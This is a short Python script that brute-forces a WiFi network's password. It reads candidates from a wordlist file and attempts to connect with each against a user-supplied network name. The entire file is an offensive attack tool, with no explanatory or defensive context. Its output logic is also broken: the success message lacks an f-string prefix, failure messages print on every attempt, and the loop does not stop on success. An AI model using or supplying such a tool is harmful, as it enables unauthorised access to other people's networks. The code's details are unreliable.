from wireless import Wireless
from termcolor import colored

def bruteforce(name):
    wire = Wireless()
    file = open('password.txt')
    for line in file.readlines():
        if wire.connect(ssid=name, password=line.strip()) == True:
            print(colored('[+] Success! The password is: {line.strip()}!', 'blue'))
        else:
            print(colored('[-] Failed! The password isn\'t found. Try Another wordlist', 'red'))

if __name__=='__main__':
    name = input(colored('Name of the WiFi?: ', 'red'))
    bruteforce(name)
